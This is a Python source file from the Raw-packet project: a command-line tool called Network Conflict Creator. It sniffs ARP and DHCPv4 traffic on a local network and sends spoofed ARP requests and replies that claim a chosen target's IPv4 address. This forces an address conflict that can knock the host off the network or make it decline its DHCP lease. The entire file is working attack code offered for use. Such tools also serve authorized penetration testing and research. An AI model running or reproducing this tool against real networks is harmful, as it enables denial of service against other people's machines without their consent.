#!/usr/bin/env python3
# -*- coding: utf-8 -*-

# region Description
"""
ncc.py: Network Conflict Creator (ncc)
Author: Vladimir Ivanov
License: MIT
Copyright 2020, Raw-packet Project
"""
# endregion

# region Import
from raw_packet.Utils.base import Base
from raw_packet.Utils.utils import Utils
from raw_packet.Utils.network import RawARP, RawSniff, RawSend
from raw_packet.Utils.tm import ThreadManager
from time import sleep
from argparse import ArgumentParser, RawDescriptionHelpFormatter
from typing import Union, Dict
# endregion

# region Authorship information
__author__ = 'Vladimir Ivanov'
__copyright__ = 'Copyright 2020, Raw-packet Project'
__credits__ = ['']
__license__ = 'MIT'
__version__ = '0.2.1'
__maintainer__ = 'Vladimir Ivanov'
__email__ = 'ivanov.vladimir.mail@gmail.com'
__status__ = 'Production'
__script_name__ = 'Network Conflict Creator (ncc)'
# endregion


# region class NetworkConflictCreator
class NetworkConflictCreator:

    # region Variables
    base: Base = Base()
    utils: Utils = Utils()
    arp: RawARP = RawARP()
    sniff: RawSniff = RawSniff()
    thread_manager: ThreadManager = ThreadManager(2)

    your: Dict[str, Union[None, str]] = {'network-interface': None, 'mac-address': None}
    target: Dict[str, Union[None, str]] = {'ipv4-address': None, 'mac-address': None}
    conflict_packet: Dict[str, Union[None, bytes]] = {'request': None, 'response': None}

    replies: bool = False
    requests: bool = False
    make_conflict: bool = True
    exit_on_success: bool = False
    # endregion

    # region Init
    def __init__(self, network_interface):
        self.your = self.base.get_interface_settings(interface_name=network_interface)
        self.raw_send: RawSend = RawSend(network_interface=network_interface)
    # endregion

    # region Send ARP reply packets
    def _reply(self, packet: Dict):
        try:
            if not self.replies and not self.requests:
                if 'ARP' in packet.keys():
                    if self.target['ipv4-address'] is not None:
                        if packet['ARP']['sender-ip'] == self.target['ipv4-address'] and \
                                packet['ARP']['sender-mac'] == self.target['mac-address']:
                            self.base.print_info('Send IPv4 Address Conflict ARP response to: ',
                                                 self.target['ipv4-address'] + ' (' +
                                                 self.target['mac-address'] + ')')
                            self.make_conflict = False
                            self.raw_send.send(self.conflict_packet['response'])
                    else:
                        if packet['Ethernet']['destination'] == 'ff:ff:ff:ff:ff:ff' and \
                                packet['ARP']['opcode'] == 1 and \
                                packet['ARP']['sender-ip'] == packet['ARP']['target-ip']:
                            self.base.print_info('Sniff Gratuitous ARP request for ',
                                                 packet['ARP']['sender-ip'] + ' (' +
                                                 packet['Ethernet']['source'] + ')')
                            self.base.print_info('Send Gratuitous ARP reply for ',
                                                 packet['ARP']['sender-ip'] + ' (' +
                                                 packet['Ethernet']['source'] + ')')
                            self.raw_send.send(self.arp.make_response(ethernet_src_mac=self.your['mac-address'],
                                                                      ethernet_dst_mac=packet['Ethernet']['source'],
                                                                      sender_mac=self.your['mac-address'],
                                                                      sender_ip=packet['ARP']['sender-ip'],
                                                                      target_mac=packet['Ethernet']['source'],
                                                                      target_ip=packet['ARP']['sender-ip']))

            if 'DHCPv4' in packet.keys():

                if packet['DHCPv4'][53] == 4:
                    self.base.print_success('DHCPv4 Decline from: ',
                                            packet['DHCPv4'][50] + ' (' +
                                            packet['Ethernet']['source'] + ')',
                                            ' IPv4 address conflict detected!')
                    if self.exit_on_success:
                        exit(0)

                if packet['DHCPv4'][53] == 3:
                    if 50 in packet['DHCPv4'].keys():
                        self.base.print_success('DHCPv4 Request from: ', packet['Ethernet']['source'],
                                                ' requested ip: ', str(packet['DHCPv4'][50]))

        except KeyboardInterrupt:
            self.base.print_info('Exit')
            exit(0)

        except KeyError:
            pass

        except TypeError:
            pass
    
    # endregion

    # region ARP sniffer
    def _sniff(self):
        try:
            if self.target['ipv4-address'] is not None:
                self.base.print_info('Sniff ARP or DHCPv4 requests from: ',
                                     str(self.target['ipv4-address']) + ' (' +
                                     str(self.target['mac-address']) + ')')
                self.sniff.start(protocols=['ARP', 'IPv4', 'UDP', 'DHCPv4'], prn=self._reply,
                                 filters={'Ethernet': {'source': self.target['mac-address']},
                                          'UDP': {'source-port': 68, 'destination-port': 67}},
                                 network_interface=self.your['network-interface'],
                                 scapy_filter='arp or (udp and (port 67 or 68))',
                                 scapy_lfilter=lambda eth: eth.src == self.target['mac-address'])
            else:
                self.base.print_info('Sniff ARP or DHCPv4 requests ...')
                self.sniff.start(protocols=['ARP', 'IPv4', 'UDP', 'DHCPv4'], prn=self._reply,
                                 filters={'UDP': {'source-port': 68, 'destination-port': 67}},
                                 network_interface=self.your['network-interface'],
                                 scapy_filter='arp or (udp and (port 67 or 68))')
        except KeyboardInterrupt:
            self.base.print_info('Exit')
            exit(0)
    # endregion

    # region Start Network Conflict Creator (ncc)
    def start(self, 
              target_mac_address: Union[None, str] = None, 
              target_ip_address: Union[None, str] = None,
              broadcast: bool = False,
              replies: bool = False,
              requests: bool = False,
              exit_on_success: bool = False,
              number_of_packets: int = 10) -> None:
        try:

            # region Set Variables
            self.replies = replies
            self.requests = requests
            self.exit_on_success = exit_on_success
            # endregion
            
            # region Check Target MAC- and IP-address
            if target_ip_address is not None:
                self.target = self.utils.set_ipv4_target(network_interface=self.your['network-interface'],
                                                         target_ipv4_address=target_ip_address,
                                                         target_mac_address=target_mac_address)
                pass
            # endregion
            
            # region Target IP address is not Set
            if self.target['ipv4-address'] is None:
                self._sniff()
            # endregion

            # region Target IP address is Set
            if self.target['ipv4-address'] is not None:
                
                # region Make ARP conflict packets
                self.conflict_packet['response'] = self.arp.make_response(ethernet_src_mac=self.your['mac-address'],
                                                                          ethernet_dst_mac=self.target['mac-address'],
                                                                          sender_mac=self.your['mac-address'],
                                                                          sender_ip=self.target['ipv4-address'],
                                                                          target_mac=self.target['mac-address'],
                                                                          target_ip=self.target['ipv4-address'])
                if broadcast:
                    destination_mac_address = 'ff:ff:ff:ff:ff:ff'
                else:
                    destination_mac_address = '33:33:00:00:00:01'
                random_ip: str = self.base.get_random_ip_on_interface(self.your['network-interface'])
                self.conflict_packet['request'] = self.arp.make_request(ethernet_src_mac=self.your['mac-address'],
                                                                        ethernet_dst_mac=destination_mac_address,
                                                                        sender_mac=self.your['mac-address'],
                                                                        sender_ip=self.target['ipv4-address'],
                                                                        target_mac='00:00:00:00:00:00',
                                                                        target_ip=random_ip)
                # endregion

                # region Start Sniffer in thread
                self.thread_manager.add_task(self._sniff)
                sleep(3)
                # endregion

                # region Send ARP reply packets
                if self.replies:
                    self.base.print_info('Send only ARP reply packets to: ',
                                         str(self.target['ipv4-address']) + ' (' +
                                         str(self.target['mac-address']) + ')')
                    self.raw_send.send(packet=self.conflict_packet['response'], count=number_of_packets, delay=0.5)
                # endregion

                # region Send ARP request packets
                elif self.requests:
                    self.base.print_info('Send only Multicast ARP request packets to: ',
                                         str(self.target['ipv4-address']) + ' (' +
                                         str(self.target['mac-address']) + ')')
                    self.raw_send.send(packet=self.conflict_packet['request'], count=number_of_packets, delay=0.5)
                # endregion

                # region Send Multicast ARP request packets
                else:
                    current_number_of_packets: int = 0
                    while self.make_conflict:
                        if current_number_of_packets == number_of_packets:
                            break
                        else:
                            self.base.print_info('Send Multicast ARP request to: ',
                                                 str(self.target['ipv4-address']) + ' (' +
                                                 str(self.target['mac-address']) + ')')
                            self.raw_send.send(packet=self.conflict_packet['request'])
                            sleep(3)
                            current_number_of_packets += 1
                # endregion

            # endregion

        except KeyboardInterrupt:
            self.base.print_info('Exit')
            exit(0)

        except AssertionError as Error:
            self.base.print_error(Error.args[0])
            exit(1)

    # endregion

# endregion


# region Main function
def main():

    # region Init Raw-packet classes
    base: Base = Base()
    # endregion

    # region Check User and Platform
    base.check_user()
    base.check_platform(available_platforms=['Linux', 'Darwin', 'Windows'])
    # endregion

    # region Parse script arguments
    script_description: str = \
        base.get_banner() + '\n' + \
        ' ' * (int((55 - len(__script_name__)) / 2)) + \
        base.info_text(__script_name__) + '\n\n'
    parser = ArgumentParser(description=script_description, formatter_class=RawDescriptionHelpFormatter)
    parser.add_argument('-i', '--interface', type=str, help='Set interface name for listen and send packets')
    parser.add_argument('-m', '--target_mac', type=str, help='Set target MAC address', default=None)
    parser.add_argument('-t', '--target_ip', type=str, help='Set target IP address', default=None)
    parser.add_argument('--replies', action='store_true', help='Send only ARP replies')
    parser.add_argument('--requests', action='store_true', help='Send only ARP requests')
    parser.add_argument('--broadcast', action='store_true', help='Send broadcast ARP requests')
    parser.add_argument('-p', '--packets', type=int, help='Number of ARP packets (default: 10)', default=10)
    parser.add_argument('-q', '--quiet', action='store_true', help='Minimal output')
    parser.add_argument('-e', '--exit', action='store_true', help='Exit on success')
    args = parser.parse_args()
    # endregion

    # region Print banner
    if not args.quiet:
        base.print_banner()
    # endregion

    # region Network interface settings and Bind raw socket
    if args.interface is None:
        base.print_warning("Please set a network interface for sniffing ARP and DHCP requests ...")
    current_network_interface: str = base.network_interface_selection(args.interface)
    # endregion

    # region Start Network Conflict Creator
    ncc: NetworkConflictCreator = NetworkConflictCreator(network_interface=current_network_interface)
    ncc.start(target_mac_address=args.target_mac,
              target_ip_address=args.target_ip,
              broadcast=args.broadcast,
              replies=args.replies,
              requests=args.requests,
              exit_on_success=args.exit,
              number_of_packets=args.packets)
    # endregion

# endregion


# region Call Main function
if __name__ == "__main__":
    main()
# endregion
